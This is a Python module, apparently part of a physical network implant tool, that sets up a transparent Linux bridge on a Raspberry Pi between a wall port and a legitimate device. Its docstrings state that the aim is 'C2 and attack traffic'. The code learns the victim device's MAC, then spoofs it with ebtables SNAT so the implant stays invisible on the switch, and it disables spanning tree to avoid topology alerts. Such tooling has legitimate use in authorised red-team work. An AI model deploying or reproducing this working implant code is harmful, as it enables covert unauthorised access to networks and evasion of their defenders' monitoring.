#!/usr/bin/env python3
"""Transparent bridge manager.

Creates a Linux bridge (br0) between the onboard ethernet (uplink to
the network) and a USB-ethernet adapter (downstream to the legitimate
device).  The bridge forwards all frames transparently so the switch
sees only the legitimate device's MAC.

The Pi can also assign itself an IP on br0 for C2 and attack traffic.
ebtables SNAT rewrites the Pi's outgoing MAC to match the legitimate
device, achieving full Layer-2 invisibility.
"""

import logging
import shutil
import subprocess
import time
from pathlib import Path

from lib import netconfig

log = logging.getLogger("landnav.bridge")

BRIDGE_NAME = "br0"

# ── Helpers ─────────────────────────────────────────────────────

def _run(cmd, check=True, timeout=15):
    log.debug("exec: %s", " ".join(cmd) if isinstance(cmd, list) else cmd)
    return subprocess.run(
        cmd, capture_output=True, text=True,
        check=check, timeout=timeout,
    )

def _has(binary):
    return shutil.which(binary) is not None

# ── Bridge Lifecycle ────────────────────────────────────────────

def create_bridge(uplink, downstream, stp=False):
    """Create br0 bridging uplink (wall port) and downstream (legit device).

    Args:
        uplink:     Interface name connected to the wall (e.g. eth0)
        downstream: Interface name connected to legit device (e.g. eth1)
        stp:        Enable spanning tree (default False — avoids topology alerts)

    Returns:
        True on success, False on failure.
    """
    log.info("Creating bridge %s: %s (uplink) + %s (downstream)",
             BRIDGE_NAME, uplink, downstream)

    try:
        # Tear down any previous bridge
        destroy_bridge()

        # Flush existing config from member interfaces
        netconfig.flush_interface(uplink)
        netconfig.flush_interface(downstream)

        # Create bridge
        _run(["ip", "link", "add", BRIDGE_NAME, "type", "bridge"])

        # Configure STP
        stp_val = 1 if stp else 0
        _run(["ip", "link", "set", BRIDGE_NAME, "type", "bridge",
              "stp_state", str(stp_val)])

        # Set forward delay to 0 (no waiting)
        _run(["ip", "link", "set", BRIDGE_NAME, "type", "bridge",
              "forward_delay", "0"])

        # Add interfaces to bridge
        _run(["ip", "link", "set", uplink, "master", BRIDGE_NAME])
        _run(["ip", "link", "set", downstream, "master", BRIDGE_NAME])

        # Bring everything up
        netconfig.set_interface_up(uplink)
        netconfig.set_interface_up(downstream)
        netconfig.set_interface_up(BRIDGE_NAME)

        # Enable promiscuous mode for packet capture
        netconfig.set_interface_promisc(BRIDGE_NAME, True)

        log.info("Bridge %s created successfully", BRIDGE_NAME)
        return True

    except subprocess.CalledProcessError as e:
        log.error("Bridge creation failed: %s — stderr: %s", e, e.stderr)
        return False
    except Exception as e:
        log.error("Bridge creation failed: %s", e)
        return False


def destroy_bridge():
    """Tear down br0 and release member interfaces."""
    if not netconfig.interface_exists(BRIDGE_NAME):
        return

    log.info("Destroying bridge %s", BRIDGE_NAME)

    try:
        # Remove ebtables rules
        clear_mac_transparency()

        netconfig.set_interface_down(BRIDGE_NAME)
        _run(["ip", "link", "del", BRIDGE_NAME], check=False)
    except Exception as e:
        log.warning("Bridge teardown: %s", e)


def bridge_is_up():
    """Check if br0 exists and is UP."""
    if not netconfig.interface_exists(BRIDGE_NAME):
        return False
    info = netconfig.get_interface_info(BRIDGE_NAME)
    return info["state"] == "UP"

# ── MAC Transparency ────────────────────────────────────────────

def set_mac_transparency(legit_mac, uplink="eth0"):
    """Configure ebtables to rewrite Pi's outgoing frames with the
    legitimate device's MAC address.

    This makes the Pi invisible on the switch port — only one MAC
    (the legitimate device's) ever appears on the wire.

    Args:
        legit_mac: MAC address of the legitimate device (aa:bb:cc:dd:ee:ff)
        uplink:    The interface connected to the network switch
    """
    if not _has("ebtables"):
        log.warning("ebtables not found — MAC transparency unavailable. "
                     "The switch will see two MACs on this port.")
        return False

    log.info("Setting MAC transparency: Pi traffic will use MAC %s on %s",
             legit_mac, uplink)

    try:
        # Clear existing rules first
        clear_mac_transparency()

        # SNAT: rewrite source MAC on all frames leaving via uplink
        # --snat-arp also rewrites ARP source hardware address
        _run(["ebtables", "-t", "nat", "-A", "POSTROUTING",
              "-o", uplink, "-j", "snat",
              "--to-source", legit_mac, "--snat-arp"])

        log.info("MAC transparency active")
        return True

    except subprocess.CalledProcessError as e:
        log.error("ebtables SNAT failed: %s — stderr: %s", e, e.stderr)
        return False


def clear_mac_transparency():
    """Remove all ebtables SNAT rules."""
    if not _has("ebtables"):
        return
    _run(["ebtables", "-t", "nat", "-F"], check=False)


def get_downstream_mac(downstream_iface, timeout=30):
    """Learn the MAC address of the device connected to the downstream port.

    Watches for any Ethernet frame arriving on the downstream interface
    and returns its source MAC.

    Falls back to reading the interface's neighbor table.
    """
    log.info("Waiting for downstream device MAC on %s (timeout %ds)",
             downstream_iface, timeout)

    # Method 1: Read from the bridge's FDB (forwarding database)
    # The bridge learns MACs automatically
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            r = _run(["bridge", "fdb", "show", "dev", downstream_iface],
                     check=False, timeout=5)
            if r.returncode == 0:
                for line in r.stdout.splitlines():
                    parts = line.split()
                    if len(parts) >= 1:
                        mac = parts[0].strip()
                        # Skip multicast/broadcast and the bridge's own MAC
                        if (mac and ":" in mac
                                and not mac.startswith("33:33:")
                                and not mac.startswith("01:00:")
                                and not mac.startswith("ff:ff:")
                                and "master" in line):
                            log.info("Downstream device MAC: %s", mac)
                            return mac
        except Exception:
            pass
        time.sleep(2)

    # Method 2: tcpdump fallback — grab any frame from downstream
    if _has("tcpdump"):
        log.info("FDB empty — trying tcpdump on %s", downstream_iface)
        try:
            r = _run(
                ["timeout", str(min(timeout, 15)),
                 "tcpdump", "-c", "1", "-e", "-i", downstream_iface,
                 "-Q", "in", "not", "ether", "broadcast"],
                check=False, timeout=timeout + 5,
            )
            if r.returncode == 0 or r.stdout:
                output = r.stdout + r.stderr
                import re
                m = re.search(r"([0-9a-f]{2}(?::[0-9a-f]{2}){5})", output, re.I)
                if m:
                    mac = m.group(1)
                    log.info("Downstream device MAC (tcpdump): %s", mac)
                    return mac
        except Exception as e:
            log.warning("tcpdump fallback failed: %s", e)

    log.warning("Could not determine downstream device MAC")
    return None

# ── Bridge IP Configuration ─────────────────────────────────────

def configure_bridge_ip(ip, cidr, gateway, dns_servers=None, domain=None):
    """Assign the Pi its own IP on the bridge for C2 and attack traffic.

    Args:
        ip:          IP address for the Pi
        cidr:        CIDR prefix length (e.g. 24)
        gateway:     Default gateway
        dns_servers: List of DNS server IPs
        domain:      Search domain
    """
    log.info("Configuring bridge IP: %s/%d gw %s", ip, cidr, gateway)
    netconfig.set_ip(BRIDGE_NAME, ip, cidr)
    netconfig.set_default_route(gateway, BRIDGE_NAME)
    if dns_servers:
        netconfig.set_dns(dns_servers, domain)
